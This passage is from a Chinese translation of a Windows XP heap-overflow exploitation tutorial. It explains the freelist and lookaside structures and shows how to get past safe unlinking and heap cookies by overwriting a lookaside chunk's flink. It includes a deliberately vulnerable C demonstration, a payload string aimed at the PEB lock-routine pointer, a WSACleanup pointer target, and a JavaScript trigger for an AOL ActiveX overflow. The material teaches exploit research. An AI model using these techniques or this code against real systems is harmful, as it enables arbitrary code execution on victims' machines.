outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480588&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">UnCommitedRanges&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480034&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00000000&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">AllocatorBackTraceIndex&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480036&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00000000&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Reserved&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00480038&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">0x00381eb8&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">LastEntryInSegment&nbsp;</p></td></tr></tbody></table>

在一个segment中重要的信息是第一个chunk。单这条信息就可以用来"遍历"segment，如是你可以简单地 通过知道大小及间隔 显示chunk并且下一个chunk

0x03 后端分配器 - Freelist:
----------------------

* * *

在堆结构的0x178偏移量上，我们可以看到FreeList[]数组的开头。这个FreeList包含了一个双向链接的chunk list。他们通过既有flink又有blink的方式来双向链接。

[![](http://static.wooyun.org/20140918/2014091812463543476.png)](http://net-ninja.net/images/freelist.png)

上面的图表显示了freelist包含着范围在0-128的堆chunk索引数组。任意chunk的大小在0和1016之间（之所以是1016是因为最大1024减去8字节的元数据）并存储在[它们的分配大小]*8位置。举例来说，我有一个40字节大小的chunk来free，那么我将会把这个chunk放在freelist中index为4的位置（40/8）

译者注：40/8=5 ；0,1,2,3,4 所以放在4

如果一个chunk的大小超过了1016（127*8）个字节，那么它将会以数值大小顺序被存储在freelist[0]条目中。下面是关于freelist chunk的描述

<table border="0" style="box-sizing: border-box; border-collapse: collapse; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><colgroup style="box-sizing: border-box;"><col style="box-sizing: border-box; width: 95px;"><col style="box-sizing: border-box; width: 84px;"><col style="box-sizing: border-box; width: 84px;"><col style="box-sizing: border-box; width: 108px;"><col style="box-sizing: border-box; width: 65px;"><col style="box-sizing: border-box; width: 77px;"><col style="box-sizing: border-box; width: 84px;"></colgroup><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-width: 0.75pt; border-style: outset; border-color: initial;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">Headers</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Self Size (0x2)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Prev Size (0x2)</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Segment index (0x1)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Flag (0x1)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Unused (0x1)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Tag index (0x1)&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">flink/blink</strong></p></td><td colspan="2" style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Flink (0x4)&nbsp;</p></td><td colspan="4" style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Blink (0x4)&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">Data</strong></p></td><td colspan="6" style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;">&nbsp;</td></tr></tbody></table>

**Freelist Mitigations:**

微软发布了一些mitigation来防止对于freelist条目的unlink攻击，下面是一段对mitigation简短的描述。

_对freelist的Safe unlinking：_

Safe unlinking 是被微软在Windows XP sp2及以后实现的一种保护机制。本质上它是一种防范被攻击利用[之前在Heap Overflows for Humans 101里提及的4字节写]的技术。在这种检测之下，之前的chunk 'flink'指针指向我们分配的chunk并且临近的chunk指向我们分配的chunk。下面是对于对应的安全机制的描述图表

Freelist chunk 1[flink] == Freelist chunk 2 && Freelist chunk 3[blink] ==Freelist chunk 2

![](http://drops.javaweb.org/uploads/images/0c75a8f668dd093bf0f7f621b7e0e3e1a89729a1.jpg)

红线是检查发生的地方

![](http://drops.javaweb.org/uploads/images/a7f0818e1f98dedd52e6a5264b7cacce791f3b09.jpg)

如果任何检查未通过，那么就jump到ntdll.dll的0x7c936934，正如你所见这几乎与我们传统的unlink相同除了我们加入了检查flink/blink的代码

Freelist header cookies：

对于Windows XP sp2的介绍中可见一个随机的堆cookie位于chunk header中的0x5偏移。。只有freelist chunks有这些cookie检查。下面是一张加亮了安全cookie的关于堆chunk的图片。这是一条随机单字节条目，这样有最大256种可能的值。记住你在一个多线程的环境下也许能够暴力穷举这个值。

![](http://drops.javaweb.org/uploads/images/8de1921bc88ca23d0dad9bc6bf1a9eaa58cb55de.jpg)

0x04 前端分配器-Lookaside：
---------------------

* * *

Lookaside list是一个用来存储小于1016字节堆chunks的单链表。Lookaside体现的理念是加速并且查找起来更快。这是因为程序在进程的执行生命期内多次执行HeapAlloc() 和 HeapFree()。因为它是为速度和效率设计的，所以它允许了每个条目不多于3个的空闲chunk。如果HeapFree()在一个chunk上调用并且已经有了3个条目的特定chunk大小，那么它就会被free到Freelist[n]

堆的chunk大小总计是 实际分配大小+用来header的额外的8字节。所以如果如果为16字节做分配，那么就会在lookaside list里面扫描24字节（16+chunk header）大小的chunk。在下图的情况下，windows堆管理器会成功并且在lookaside list中index 2找到一个可用的chunk。

Lookaside list 仅包含了一个flink指针指向下一个可用的chunk（用户数据）

<table border="0" style="box-sizing: border-box; border-collapse: collapse; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><colgroup style="box-sizing: border-box;"><col style="box-sizing: border-box; width: 95px;"><col style="box-sizing: border-box; width: 85px;"><col style="box-sizing: border-box; width: 85px;"><col style="box-sizing: border-box; width: 77px;"><col style="box-sizing: border-box; width: 69px;"><col style="box-sizing: border-box; width: 77px;"><col style="box-sizing: border-box; width: 109px;"></colgroup><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-width: 0.75pt; border-style: outset; border-color: initial;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">Headers</strong></p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Self Size (0x2)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Prev Size (0x2)</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Cookie (0x1)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Flags (0x1)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Unused (0x1)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: 0.75pt outset; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Segment index (0x1)&nbsp;</p></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">flink/blink</strong></p></td><td colspan="2" style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;"><p style="box-sizing: border-box; margin: 20px 0px;">Flink (0x4)&nbsp;</p></td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 1px solid rgb(224, 224, 224);">&nbsp;</td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 1px solid rgb(224, 224, 224);">&nbsp;</td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 1px solid rgb(224, 224, 224);">&nbsp;</td><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset;">&nbsp;</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: 0.75pt outset;"><p style="box-sizing: border-box; margin: 20px 0px;"><strong style="box-sizing: border-box; font-weight: 700;">Data</strong></p></td><td colspan="6" style="box-sizing: border-box; padding: 2px; border-bottom: 0.75pt outset; border-right: 0.75pt outset; border-top: none; border-left: none;">&nbsp;</td></tr></tbody></table>

  
![](http://drops.javaweb.org/uploads/images/c6e4654e08072beb6e10dee78c11698e6aa86a68.jpg)

当windows堆管理器接收到一个分配的请求，它会去寻找一个空闲的堆内存chunk来满足这个请求。

为了最优化以及速度，windows堆管理器将会首先进去lookaside list中（取决于它的单链表结构）并且试着去寻找一个空闲的chunk。如果这里没有找到chunk，windows堆管理器将会遍历freelist（在 freelist[1](http://static.wooyun.org/20141017/2014101720555712464.png)-freelist[127]之间）。如果没有找到任何chunk那么它将会遍历freelist[0]条目寻找更大的chunk然后分割chunk。一部分将会被返回到堆管理器并且剩下的将会返回到freelist[n] (n是基于剩下字节数的序号)。这就带领我们去往下一个章节，堆的操作。

0x05 堆操作基础：
-----------

* * *

### Chunk分割

Chunk分割指的是在为寻找大小合适的chunk并将其分解成更小的chunk时访问freelist[n]的过程。当freelist中获取到的一个chunk比请求分配的大小要大时，这个chunk将会被对半分开来满足请求的分配大小。

假设在freelist[0]是一个单独的2048字节的chunk。如果请求的分配大小是1024字节（包括了header），那么这个chunk会被分割并且有1024字节大小的chunk放回了freelist[0] 同时返回新分配的1024字节的chunk给调用者。

**Heap Coalescing:**

**堆的合并：**

堆的合并指的是将两块可用的chunk堆内存合并的动作，当中间的chunk也被free了时。

堆管理器要这样做的原因是对segment内存实行高效使用。当然，这也权衡了当chunk被释放时的效率。堆的合并是非常重要的操作因为多个chunk可以被加在一起（如果可用）并且之后可以被用于更大大小需求的分配。如果没有这个过程，那么在堆segment中浪费的chunk就会出现并且成为碎片。

0x06 绕过Windows XP sp2/3 安全机制的技术：
--------------------------------

* * *

### 覆写lookaside中的一个chunk

这个技术是最通用的绕过堆cookie以及safe unlinking检查的方法。同时（译者注：原文为whist，想必作者原意whilst打错了）这是一个针对程序的达成简单的"4字节写"的技术，一些程序可能允许你决定堆的布局以稳定exploit利用。既然在lookaside list中没有safe unlinking 或者 cookie检查，一个攻击者可以覆写 包含在临近lookaside条目中 的'flink'的值 并且通过HeapAlloc() 或者 HeapFree()调用返回那个指针 之后在下一个可用chunk中写入恶意代码。

让我们从视觉上感受它是怎样工作的，深呼吸。

1.  我们通过在当前segment中分配chunk A开始

[![](http://static.wooyun.org/20140918/2014091812463715751.png)](http://net-ninja.net/images/1.png)

1.  下一步我们在相同segment分配另一个chunk B

[![](http://static.wooyun.org/20140918/2014091812463731385.png)](http://net-ninja.net/images/2.png)

1.  现在我们free chunk B 去向lookaside list，那么有两个条目存在，一个在segment而另一个在lookaside list。.

[![](http://static.wooyun.org/20140918/2014091812463764380.png)](http://net-ninja.net/images/3.png)

1.  现在我们溢出chunk A（会在以后溢出到chunk B中并且覆写其flink）。这是将会被覆写的元数据.

[![](http://static.wooyun.org/20140918/2014091812463873983.png)](http://net-ninja.net/images/4.png)

1.  现在我们重新再一次分配B（通过分配一个和B相同大小的chunk如第二步）。这会返回chunk B的指针并且更新其在当前堆segment中的引用并且准备好下一次的分配。现在chunk B 中的flink已经更新成攻击者通过溢出A而控制的任意地址。
    
    [![](http://static.wooyun.org/20140918/2014091812463883162.png)](http://net-ninja.net/images/5.png)
    
2.  现在我们通过分配chunk C 获取控制。它将会是在chunk B之后的下一个可用chunk并且通过chunk B 的已经控制的flink 被指向了。攻击者在chunk C 填入他们的shellcode
    

[![](http://static.wooyun.org/20140918/2014091812463996674.png)](http://net-ninja.net/images/6.png)

当这些步骤全部完成，我们现在控制了一个覆写的函数指针，其将会理想地在我们的"4字节写"之后被调用。下面是我们将会说明的C代码：

```
/*
        Overwriting a chunk on the lookaside example
*/
#include <stdio.h>
#include <windows.h>
int main(int argc,char *argv[])
{
        char *a,*b,*c;
        long *hHeap;
        char buf[10];

        printf("----------------------------\n");
        printf("Overwrite a chunk on the lookaside\n");
        printf("Heap demonstration\n");
        printf("----------------------------\n");

        // create the heap
        hHeap = HeapCreate(0x00040000,0,0);
        printf("\n(+) Creating a heap at: 0x00%xh\n",hHeap);
        printf("(+) Allocating chunk A\n");

        // allocate the first chunk of size N (<0x3F8 bytes)
        a = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
        printf("(+) Allocating chunk B\n");

        // allocate the second chunk of size N (<0x3F8 bytes)
        b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);

        printf("(+) Chunk A=0x00%x\n(+) Chunk B=0x00%x\n",a,b);
        printf("(+) Freeing chunk B to the lookaside\n");

        // Freeing of chunk B: the chunk gets referenced to the lookaside list
        HeapFree(hHeap,0,b);

        // set software bp
        __asm__("int $0x3");

        printf("(+) Now overflow chunk A:\n");

        // The overflow occurs in chunk A: we can manipulate chunk B's Flink
        // PEB lock routine for testing purposes
        // 16 bytes for size, 8 bytes for header and 4 bytes for the flink

        // strcpy(a,"XXXXXXXXXXXXXXXXAAAABBBB\x20\xf0\xfd\x7f");
        // strcpy(a,"XXXXXXXXXXXXXXXXAAAABBBBDDDD");

        gets(a);

        // set software bp
        __asm__("int $0x3");

        printf("(+) Allocating chunk B\n");

        // A chunk of block size N is allocated (C). Our fake pointer is returned
        // from the lookaside list.
        b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
        printf("(+) Allocating chunk C\n");

        // set software bp
            __asm__("int $0x3");

        // A second chunk of size N is allocated: our fake pointer is returned
        c = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);

        printf("(+) Chunk A=0x00%x\n(+)Chunk B=0x00%x\n(+) Chunk C=0x00%x\n",a,b,c);

        // A copy operation from a controlled input to this buffer occurs: these
        // bytes are written to our chosen location
        // insert shellcode here
    gets(c);

        // set software bp
            __asm__("int $0x3");

        exit(0);
 }

```

我们之所以有好多**asm**("int $0x3");指令是为了在调试器中设置软件断点来暂停程序执行。其他选择的话，你也可以在调试器中打开编译后的二进制文件然后再每个call下断点。在dev c++（it uses AT&T in-line assembly compiling with gcc.exe）中编译代码。当代码在调试器中执行触发第一个断点时让我们来看一下。

![](http://drops.javaweb.org/uploads/images/5d836ddacf3cd1806d3960212ec9220c90f51449.jpg)

我们可以看到在segment 0x00480000有两个已分配的chunk大小为0x18.如果我们减去0x8字节我们还剩0x10即16个字节。让我们来看一看lookaside并且观察我们是否把chunk B free过去了

![](http://drops.javaweb.org/uploads/images/a92277fbeab7351a454048309759da369d4682b5.jpg)

太棒了！所以我们可以在lookaside看到我们的chunk(差8字节指到header)。这个chunk被free到这个位置取决于其大小< 1016并且目前在lookaside中有<= 3 chunk 指定那个chunk size。

为了进一步确认，让我们看一眼freelist并且观察发生了什么

![](http://drops.javaweb.org/uploads/images/b3da38dce2dd6473c2798a5068298ea47796f8e2.jpg)

好的 那么它看上去很直接，除了 一些在freelist[0]在创建segment时正常的一些分配外 没有其他条目。继续，我们用一些0x41溢出chunk A到临近的chunk header。使用同样的数据，我们将用0x44溢出临近chunk的flink.

![](http://drops.javaweb.org/uploads/images/bf70816c06b1e89534361df02082a9ce908b9cb4.jpg)

太棒了 我们可以看到我们分配的0x00481ea8-0x8（chunk B）已经被攻击者的输入覆写了。我们也可以看到lookaside条目包含着0x4444443c这个值，如果我们把这个值加上0x8字节就会是0x44444444即我们使用的确切值！因此在这一点上你可以理解你是怎样控制chunk B 的flink的 ：）

一旦执行与chunk B(0x00481ea8-0x8)大小相同的分配，chunk B 的条目将被从lookaside[3](http://static.wooyun.org/20141017/2014101720555724243.png)移除并且返回给调用者。注意额外的，header也同样被完全控制了。

![](http://drops.javaweb.org/uploads/images/cf751a0e68b6aa0636611b0bb5e9e1aa6068c47b.jpg)

所以如果我们仔细看看chunk A(0x00481e88)我们可以看到这个chunk正在被使用因为flag设置成0x1（表示它状态busy）。下一个在(0x00481ea0)的chunk目前还没有被更新因为其仍然被free到lookaside中。

![](http://drops.javaweb.org/uploads/images/0be0a2a937a7ab59eb7c04e6bd22ce923050238c.jpg)

这时候，代码将会在READ操作上违反访问规则。当使用这种技术攻击一个程序时，我们会把0x44444444用一个函数指针替换（虚假flink）。现在，当堆管理器创建了下一个分配的chunk，该程序将会在虚假指针处写入。我们现在会分配chunk C并且用任意shellcode填充buffer。这里的这个想法是让我们的函数指针在程序崩溃之前被调用（或者因为崩溃而调用）。我没在Heap Overflow for Humans 101中提到的一个非常聪明的技巧是 攻击者可以利用PEB全局函数指针（仅在XP SP1 之前）。但是在windows XP SP2 及更高版本，这些地址指针都是随机的。让我们来看看这个，在把二进制文件装载进调试器时我们首先看到：

![](http://drops.javaweb.org/uploads/images/7c0f1d44d38e631ee3ff73cfcfefe618daadcc47.jpg)

我们再做一遍：

![](http://drops.javaweb.org/uploads/images/a438d84fba6fed142883ed60065501d768bef9eb.jpg)

注意以上两个PEB指针是不同的。当触发一个异常时，异常处理器大致将调用ExitProcess()，其又会调用RtlAcquirePebLock()。这项操作管理的是在处理异常期间不许修改peb 并且当处理器结束运作，它将会通过调用RtlReleasePebLock()释放lock。另外，在这些函数中使用的指针并不是W^X保护的而这意味着我们可以在那个内存区域写入并且运行。这些函数每一个都利用了静态指针与固定的相对的peb的偏移量。下面是RtlAcquirePebLock()函数并且正如你所见，FS:[18](http://static.wooyun.org/20141017/2014101720555873429.png)(peb)被移进了EAX。接着，全局函数指针被存储在0x30偏移量的地方。而将会被调用的函数'FastPebLockRoutine()'位于0x24偏移量位置。

```
7C91040D > 6A 18            PUSH 18
7C91040F   68 4004917C      PUSH ntdll.7C910440
7C910414   E8 B2E4FFFF      CALL ntdll.7C90E8CB
7C910419   64:A1 18000000   MOV EAX,DWORD PTR FS:[18]
7C91041F   8B40 30          MOV EAX,DWORD PTR DS:[EAX+30]
7C910422   8945 E0          MOV DWORD PTR SS:[EBP-20],EAX
7C910425   8B48 20          MOV ECX,DWORD PTR DS:[EAX+20]
7C910428   894D E4          MOV DWORD PTR SS:[EBP-1C],ECX
7C91042B   8365 FC 00       AND DWORD PTR SS:[EBP-4],0
7C91042F   FF70 1C          PUSH DWORD PTR DS:[EAX+1C]
7C910432   FF55 E4          CALL DWORD PTR SS:[EBP-1C]
7C910435   834D FC FF       OR DWORD PTR SS:[EBP-4],FFFFFFFF
7C910439   E8 C8E4FFFF      CALL ntdll.7C90E906
7C91043E   C3               RETN

```

下面我们可以看到函数RtlReleasePebLock()直接在PEB中的全局偏移数组0x24偏移量位置调用了函数指针`'FastpebUnlockRoutine()'`

```
7C910451 > 64:A1 18000000   MOV EAX,DWORD PTR FS:[18]
7C910457   8B40 30          MOV EAX,DWORD PTR DS:[EAX+30]
7C91045A   FF70 1C          PUSH DWORD PTR DS:[EAX+1C]
7C91045D   FF50 24          CALL DWORD PTR DS:[EAX+24]
7C910460   C3               RETN

```

所以当RtlAcquirePebLock() 和 RtlReleasePebLock()过程在有异常发生时被调用，这代码将会无限的触发异常并且执行你的代码。不过你可以通过执行完shellcode然后修改指针地址到exit()修补peb来实现。

![](http://drops.javaweb.org/uploads/images/5be03a7ea34d5e53cc1b5bde1972561493bff86f.jpg)

当前进程的线程数越多，随机化的强度就越弱（随机地址将被用于多个PEB）并且我们将能够"猜解"当前PEB的地址。不过由于我们没有一个可靠的函数指针以供我们做简单的"4字节"覆写（一个通用函数指针）

有时一个程序可能会既在异常发生前又在另一个windows library函数指针被调用时使用一个自定义的函数指针 并且这就可以用我们的代码覆写那个指针并且执行shellcode。

### 特定指针攻击利用：

为了展示的目的，我将会演示通过固定的PEB全局函数指针在windows XP SP1覆写一个lookside的chunk。FastPEBLockRoutine()的地址为0x7ffdf020。现在简单地从注释中恢复下面这行

```
// strcpy(a,"XXXXXXXXXXXXXXXXAAAABBBB\x20\xf0\xfd\x7f"); 

```

然后把下面这行注释掉

```
gets(a); 

```

所以现在我们将会溢出chunk A X's并且溢出AAAA和BBBB进入chunk B的元数据并且最终使用0x7ffdf020覆写chunk B的flink。重新编译并且装入调试器。现在当我们分配chunk C（指向0x7ffdf020）时，我们可以用shellcode填充这个chunk并且当触发异常时将会被调用。下面我们可以看到如下代码设置PEB地址到EAX并且直接call调用0x20偏移量(FastPEBLockRoutine())把执行权转交到我们的代码。

![](http://drops.javaweb.org/uploads/images/c98de7f208129511c59f27cc8c315d5dac9eadc6.jpg)

现在我们对EIP拥有了直接的控制并且可以利用它返回到代码中。在这里不考虑绕过DEP以及执行代码。

### 程序特定指针攻击利用：

除非我提供一个在Windows XP SP3下使用程序特定指针利用该漏洞的例子，否则这篇文章不会完美结束。当目标针对一个包含了堆溢出的软件时，任何出现在溢出之后的硬编码可写可运行的函数调用都应该被针对并利用。

举例来说，winsock的WSACleanup()，它在XP SP3下包含了一个位于0x71ab400a的硬编码函数调用。这也可以成为我们用于往内存中写shellcode的地址。那样的话当WSACleanup()（或者许多其它winsock函数）执行时，它会重定向回shellcode。下面是对于WSACleanup()反汇编并且寻找硬编码函数调用：

![](http://drops.javaweb.org/uploads/images/407fa57ae8a6ee71798c244b3937d5c3873264ae.jpg)

几乎所有windows下面的网络程序都喜欢使用从winsock导出的函数调用并且特别是（原文是spefcially，想必是specially打错了）WSACleanup()用来清理任何socket连接，并且这些多数在溢出后肯定会被调用。因此，使用这个函数指针(0x71ac4050)来覆写 看上去运行时始终一致（原文consistantly，想必是consistently打错了）。另一个例子显示，recv()函数也包含了一个相同函数的调用。

![](http://drops.javaweb.org/uploads/images/550c0db88e7de2b18e23a8317ced71bb8c71820b.jpg)

如果我们跟踪0x71ab678f函数调用，我们可以看到我们到了这里

![](http://drops.javaweb.org/uploads/images/1b481ce4c7c68a7d3105e0c9ad714b0c01edf3ef.jpg)

你知道了什么？另一个顺下来对0x71ac4050的调用，为了确保这个会成功，让我们看看这段内存的访问权限。

![](http://drops.javaweb.org/uploads/images/3ff7dc509c4df78a08117ac3acd7f032e80bc573.jpg)

这种技术的基本难题是 因为你将会覆写那个区域，所以任何使用了winsock的shellcode(几乎所有我用的shellcode)都会失效。一种解决这难题的办法是再次把0x71ac4050恢复到原来的代码这样winsock就能工作了

### 程序特定指针攻击利用例子：

我提供了一个有漏洞的服务器程序（多数代码来自在infosec institute的Stephen Bradshaws blog，所有的赞赏归他）并且如是调整使其包括了堆溢出以及内存泄露。

构造一个'PoC'利用的思路是 通过正确的方式触发并且列出堆栈内容这样你就可以覆写一个在lookaside的chunk然后达到代码执行。下载this文件并且在windows xp sp3下运行然后尝试我在这里提供的例子来帮助你抓住这个技术的知识要点。我已经决定不提供这个的源代码这样人们必须做一些你想工作来寻找正确堆栈布局然后达到命令执行。作为一个提示（希望不是很透），这里有一张'PoC'通过确定堆布局工作的截图

![](http://drops.javaweb.org/uploads/images/f0e36b3cb72b3c8ba89c72476a982a300f30fdb8.jpg)

当然，任何情况下只要你能弄清堆内存的布局都很好。一个列出目标进程的堆的更简单的目标是稳妥地利用客户端。随着能够编写和控制堆的布局，你一定能够构造一个通过堆溢出攻击利用的场景。一个例子是利用Alex Soritov的heaplib.js来协助分配，释放以及在堆内存中实行其他字符串操作。如果使用MSHTML在相同堆中利用javascript或者DHTML来分配或者释放chunk，那么你就可以控制堆管理器并且你可以在浏览器中通过堆溢出转交执行控制。

### 对AOL 9.5 (CDDBControl.dll) ActiveX堆溢出的分析：

我决定看一下这个漏洞并且判断其在windows xp sp3下的可利用程度。尽管control被标记为脚本或初始化不安全，我觉得漏洞分析起来还是很有意思的。我本来不想添加这一小节，但是[sinn3r](http://twitter.com/)问到了，所以我决定加进去 ：）现在由于它在ActiveX控制下，一种触发的方式为通过使用一种可选的脚本语言在IE浏览器触发。我决定使用JavaScript因为其可延展性并且heapLib.js被含在里面。我使用的环境如下所示：

```
1.  IE 6/7 
2.  XP SP3 
3.  heapLib.js 

```

所以让欢乐开始吧！首先我触发了[exploit-db](http://www.exploit-db.com/exploits/11190/)上的Hellcode Research写的PoC。让我们来分析程序的crash

![](http://drops.javaweb.org/uploads/images/e400c552dbccb9b90a0c464693ba7e9940a972b0.jpg)

我们在这里可以看到当前堆的segment实际上用光了未分配内存并且无法为那个堆segment提供更多的内存。

![](http://drops.javaweb.org/uploads/images/24c2bbd70889a6df27e04640819e5ce4b117ec22.jpg)

然后我们来看一下：

![](http://drops.javaweb.org/uploads/images/3efc19aed347bfd23e5034fdef880e4dabcac811.jpg)

![](http://drops.javaweb.org/uploads/images/3d05f229a3ba9641738f262e2d8db28e4e05b9dd.jpg)

我们用光了堆segment并且没有能力创建一个新的segment。所以我们该怎么办？好吧我们知道我们必须触发一个unlink操作。为了那样做，我们需要windows堆管理器复制所有的数据进入分配的buffer（覆写其它的chunk）但是不丢失当前的segment。那么当下一此分配或者free被触发，它会试着去unlink。我修改了poc去只用2240字节代替4000字节来触发溢出

```
var x = unescape("%41"); 
while (x.length<2240) x += x; 
x = x.substring(0,2240); 
target.BindToFile(x,1); 

```

现在当我们触发这一漏洞时，我们实际上并没有让浏览器崩溃。当然chunk已经溢出了，但是直到再有一个其他的unlink操作 它不会崩溃。但是当关闭浏览器时，垃圾搜集器启动并且分配所有已经free的chunk并且如是多个对RtlAllocateHeap()的调用 然后漏洞被触发。这次事情看上去更实际了。

